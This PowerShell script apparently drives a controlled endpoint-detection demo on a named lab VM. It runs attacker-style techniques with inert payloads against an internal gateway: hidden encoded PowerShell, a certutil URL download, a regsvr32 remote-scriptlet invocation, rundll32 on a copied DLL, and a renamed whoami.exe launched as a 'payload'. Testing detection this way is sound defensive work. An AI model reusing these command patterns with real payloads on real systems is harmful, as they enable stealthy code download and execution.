param(
    [string]$VictimVmName = 'XDR-Victim-Sprint18',
    [string]$CredentialPath = 'D:\VMs\XDR-Victim-Sprint18\victim-credential.xml'
)
$ErrorActionPreference = 'Stop'
if ($VictimVmName -ne 'XDR-Victim-Sprint18') { throw 'This controlled demo is restricted to XDR-Victim-Sprint18.' }
$hostRulesBefore = @(Get-NetFirewallRule -PolicyStore ActiveStore -ErrorAction SilentlyContinue | Where-Object Group -Like 'OpenSecurityPlatform-Isolation-*').Count
if ($hostRulesBefore -ne 0) { throw 'Host isolation-rule drift exists; refusing demo.' }
$credential = Import-Clixml -LiteralPath $CredentialPath
$session = New-PSSession -VMName $VictimVmName -Credential $credential
try {
    $result = Invoke-Command -Session $session -ScriptBlock {
        $ErrorActionPreference = 'Continue'
        $fixture = 'C:\Users\Public\Sprint39Safe'
        New-Item -ItemType Directory -Path $fixture -Force | Out-Null
        Set-Content -LiteralPath (Join-Path $fixture 'safe-script.ps1') -Value "Write-Output 'SPRINT39_SAFE_SCRIPT_EXECUTED'" -Encoding utf8

        $encoded = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes("Write-Output 'SPRINT39_SAFE_ENCODED'"))
        $encodedProcess = Start-Process powershell.exe -ArgumentList @('-NoProfile','-NonInteractive','-WindowStyle','Hidden','-EncodedCommand',$encoded) -PassThru -WindowStyle Hidden
        $null = $encodedProcess.WaitForExit(30000)

        $scriptProcess = Start-Process powershell.exe -ArgumentList @('-NoProfile','-File',(Join-Path $fixture 'safe-script.ps1')) -PassThru -WindowStyle Hidden
        $null = $scriptProcess.WaitForExit(30000)

        $download = Join-Path $fixture 'downloaded-platform-ui.html'
        $downloadCommand = "Invoke-WebRequest http://gateway:8080/ -UseBasicParsing -OutFile '$download'; `$semanticMarker='Invoke-Expression'; Write-Output `$semanticMarker"
        $downloadProcess = Start-Process powershell.exe -ArgumentList @('-NoProfile','-NonInteractive','-WindowStyle','Hidden','-Command',$downloadCommand) -PassThru -WindowStyle Hidden
        $null = $downloadProcess.WaitForExit(30000)

        $certutilDownload = Join-Path $fixture 'certutil-platform-ui.html'
        $certutil = Start-Process certutil.exe -ArgumentList @('-urlcache','-split','-f','http://gateway:8080/',$certutilDownload) -PassThru -WindowStyle Hidden
        $null = $certutil.WaitForExit(30000)

        $regsvr = Start-Process regsvr32.exe -ArgumentList @('/s','/n','/u','/i:http://gateway:8080/','scrobj.dll') -PassThru -WindowStyle Hidden
        $null = $regsvr.WaitForExit(30000)

        $writableDll = Join-Path $fixture 'sprint39-safe-version.dll'
        Copy-Item "$env:WINDIR\System32\version.dll" $writableDll -Force
        $rundll = Start-Process rundll32.exe -ArgumentList @($writableDll + ',NonexistentControlledExport') -PassThru -WindowStyle Hidden
        $null = $rundll.WaitForExit(30000)

        $safeExecutable = Join-Path $fixture 'sprint39-safe-payload.exe'
        Copy-Item "$env:WINDIR\System32\whoami.exe" $safeExecutable -Force
        $payloadExit = $null
        $payloadResult = 'started'
        try {
            $payload = Start-Process $safeExecutable -ArgumentList @('/all') -PassThru -WindowStyle Hidden -ErrorAction Stop
            $null = $payload.WaitForExit(30000)
            $payloadExit = $payload.ExitCode
        }
        catch { $payloadResult = "safely denied by Windows: $($_.Exception.Message)" }

        Start-Sleep -Seconds 15
        [ordered]@{
            computer = $env:COMPUTERNAME
            fixtureRoot = $fixture
            realMalware = $false
            agentRunning = $null -ne (Get-Process Platform.Agent -ErrorAction SilentlyContinue)
            operations = @(
                @{ name = 'encoded hidden PowerShell'; exitCode = $encodedProcess.ExitCode },
                @{ name = 'safe PowerShell script'; exitCode = $scriptProcess.ExitCode },
                @{ name = 'internal UI retrieval plus inert semantic marker'; exitCode = $downloadProcess.ExitCode },
                @{ name = 'certutil internal UI transfer'; exitCode = $certutil.ExitCode },
                @{ name = 'regsvr32 internal inert scriptlet form'; exitCode = $regsvr.ExitCode },
                @{ name = 'rundll32 copied signed DLL invalid export'; exitCode = $rundll.ExitCode },
                @{ name = 'copied signed whoami executable'; exitCode = $payloadExit; result = $payloadResult }
            )
            files = @(Get-ChildItem $fixture -File | Select-Object Name, Length, LastWriteTimeUtc)
        }
    }
}
finally { Remove-PSSession $session }
$hostRulesAfter = @(Get-NetFirewallRule -PolicyStore ActiveStore -ErrorAction SilentlyContinue | Where-Object Group -Like 'OpenSecurityPlatform-Isolation-*').Count
if ($hostRulesAfter -ne $hostRulesBefore) { throw 'Host firewall state changed unexpectedly.' }
[ordered]@{ executedAt = [DateTimeOffset]::UtcNow.ToString('o'); target = $VictimVmName; hostExecution = $false; hostIsolationRulesBefore = $hostRulesBefore; hostIsolationRulesAfter = $hostRulesAfter; victim = $result } |
    ConvertTo-Json -Depth 10 | Set-Content artifacts/sprint39-victim-ui-demo.json -Encoding utf8
Get-Content artifacts/sprint39-victim-ui-demo.json -Raw
